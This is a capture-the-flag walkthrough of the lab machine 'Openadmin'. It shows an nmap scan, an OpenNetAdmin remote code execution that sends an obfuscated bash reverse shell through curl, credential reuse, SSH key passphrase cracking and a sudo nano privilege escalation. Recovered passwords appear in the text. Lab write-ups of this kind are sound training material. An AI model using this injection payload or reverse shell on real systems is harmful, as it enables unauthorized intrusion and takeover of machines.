# Openadmin
## nmap scan

```log
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 15:21 EDT
Nmap scan report for 10.10.10.171
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Li%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   190.96 ms 10.10.16.1
2   94.46 ms  10.10.10.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.34 seconds
```

Found a website at `/artwork/`

<p align="center">
  <img  src="Pasted image 20210718203043.png">
</p>

Found page at `/music/`

<p align="center">
  <img  src="Pasted image 20210718210829.png">
</p>

Found OpenNetAdmin at `/ona/`

<p align="center">
  <img  src="Pasted image 20210718210913.png">
</p>

I used an RCE exploit on OpenNetAdmin (https://medium.com/r3d-buck3t/remote-code-execution-in-opennetadmin-5d5a53b1e67) to get a shell using this command :

``` bash
curl -silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%79%4e%79%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68&xajaxargs[]=ping" http://10.10.10.171/ona/
```

`65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%69%34%79%4e%79%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68`

is the url encode of :
`echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNy80NDQ0IDA+JjE= | base64 -d | bash`

<p align="center">
  <img  src="Pasted image 20210718222123.png">
</p>

Found DB credentials in ona :

<p align="center">
  <img  src="Pasted image 20210718230919.png">
</p>

`n1nj4W4rri0R!`

Password works for user `jimmy`:

<p align="center">
  <img  src="Pasted image 20210718231036.png">
</p>

Found a internal open port `52846` that gives access to a web page :

<p align="center">
  <img  src="Pasted image 20210718231219.png">
</p>

Let's SSH tunnel it :

<p align="center">
  <img  src="Pasted image 20210718231455.png">
</p>


<p align="center">
  <img  src="Pasted image 20210718231510.png">
</p>

The code source of the webpage is in `var/www/internal`

<p align="center">
  <img  src="Pasted image 20210718234105.png">
</p>
<p align="center">
  <img  src="Pasted image 20210718234332.png">
</p>

We can see that the username is `jimmy` and the password is hashed, let's crack it :

<p align="center">
  <img  src="Pasted image 20210718234205.png">
</p>

We login and we can see the ssh key of joanna : 

<p align="center">
  <img  src="Pasted image 20210718234305.png">
</p>

Let's SSH in :

<p align="center">
  <img  src="Pasted image 20210718235431.png">
</p>

Needs a passphrase, notice they said "Don't forget you ninja password", so tried `ninja` and jimmy's password but didn't work, so i extracted all the password with `ninja` keyword from the `rockyou.txt` wordlist :

```bash
grep ninja /home/kali/Desktop/rockyou.txt > ninja.txt 
```

and cracked it using `john` :

<p align="center">
  <img  src="Pasted image 20210718235654.png">
</p>

passphrase is `bloodninjas`

<p align="center">
  <img  src="Pasted image 20210718235738.png">
</p>

Got user flag

## Priv esc
<p align="center">
  <img  src="Pasted image 20210719000020.png">
</p>

We can run nano as sudo
So I did the steps shown in GTFObins:

<p align="center">
  <img  src="Pasted image 20210719000315.png">
</p>
Got the root flag~~